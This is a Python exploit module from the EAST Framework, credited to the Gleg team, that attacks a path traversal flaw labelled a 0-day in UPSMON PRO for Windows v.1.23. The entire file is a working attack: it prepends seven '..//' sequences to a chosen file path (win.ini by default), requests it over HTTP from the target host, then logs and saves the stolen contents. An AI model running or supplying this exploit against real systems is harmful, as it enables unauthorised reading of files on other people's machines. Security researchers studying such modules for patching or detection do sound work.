#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import urllib2
from collections import OrderedDict

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_upsmon_pro_fd"
INFO['DESCRIPTION'] = "UPSMON PRO for Windows v.1.23 - Path Traversal Vulnerability"
INFO['VENDOR'] = "http://pcm.ru/support/ups-control/upsmon-plus/"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['']
INFO["CVE Name"] = "0-day"
INFO["NOTES"] = """Path traversal vulnerability that can be exploited to read files outside of the web root
"""

INFO['CHANGELOG'] = "09 Nov 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 8000, dict(description = 'Target port')
OPTIONS['PATH'] = 'windows/win.ini', dict(description = 'Path to downloaded file at target machine')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.path = OPTIONS['PATH']
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.path = self.args.get('PATH', OPTIONS['PATH'])
    
    def make_url(self, path = ''):
        return 'http://{}:{}{}'.format(self.host, self.port, path)
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        url = self.make_url('/')
        url += '..//' * 7
        url += self.path.replace('/', '//')
        content = ''
        self.log('Try to download file ' + self.path)
        try:
            fd = urllib2.urlopen(url)
            content = fd.read()
            if content:
                self.log('= File Content =')
                self.log(content)
                self.log('= End of File  =')
                self.writefile(content)
                self.finish(True)
        except Exception as e:
            self.log(e)
                
        self.finish(False)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
